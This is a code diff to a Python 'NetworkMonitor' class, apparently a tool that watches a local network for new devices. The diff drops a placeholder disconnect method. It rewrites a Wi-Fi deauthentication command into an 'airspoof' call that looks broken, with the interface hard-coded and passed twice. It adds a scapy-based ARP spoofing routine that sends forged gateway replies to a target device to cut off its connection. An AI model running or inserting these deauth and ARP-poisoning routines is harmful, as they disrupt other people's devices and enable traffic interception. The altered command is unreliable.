@@ -60,16 +60,6 @@ class NetworkMonitor:
                 self.alert_manager.send_alert(device_ip, device_mac)
                 print(f"New device: IP {device_ip}, MAC {device_mac}, Name: {device_name}")
 
-    def disconnect_device(self, ip, mac):
-        # This is a placeholder method.
-        # In practice, you might use firewall rules, IP blocking, or MAC address blocking.
-        # For demonstration, let's just print the action.
-        print(f"Disconnecting device with IP: {ip} and MAC: {mac}")
-        
-        # Example: Add logic here for firewall or network-level disconnection.
-        # Return True to indicate success.
-        return True
-
     def deauth_device(self, target_mac, bssid, interface='wlan0'):
         """
         Sends deauth packets to the specified device.
@@ -82,7 +72,7 @@ class NetworkMonitor:
         try:
             # Ensure that the interface is in monitor mode before running this command
             cmd = [
-                "sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", target_mac, interface
+                "sudo", "airspoof", "-i", "wlan0", "-a", bssid, "-c", target_mac, interface
             ]
             result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
@@ -96,6 +86,31 @@ class NetworkMonitor:
             print(f"Error during deauth: {e}")
             return False
 
+
+    def arp_spoof(self, target_ip, target_mac, gateway_ip, interface='eth0'):
+        """
+        Sends ARP packets to the target device to disrupt its connection to the network.
+
+        Parameters:
+            target_ip (str): IP address of the target device.
+            target_mac (str): MAC address of the target device.
+            gateway_ip (str): IP address of the network gateway (router).
+            interface (str): Network interface for sending packets.
+        """
+        # Create ARP packet: Target thinks our machine is the gateway
+        arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
+        
+        try:
+            # Send packets in a loop for persistence
+            for _ in range(5):
+                send(arp_response, iface=interface, verbose=False)
+                time.sleep(1)  # Send a packet every second for 5 seconds
+            return True
+        except Exception as e:
+            print(f"Error in ARP spoofing: {e}")
+            return False
+
+            
     def start_monitoring(self):
         self.scan_network()
         print("Starting live network monitoring...")
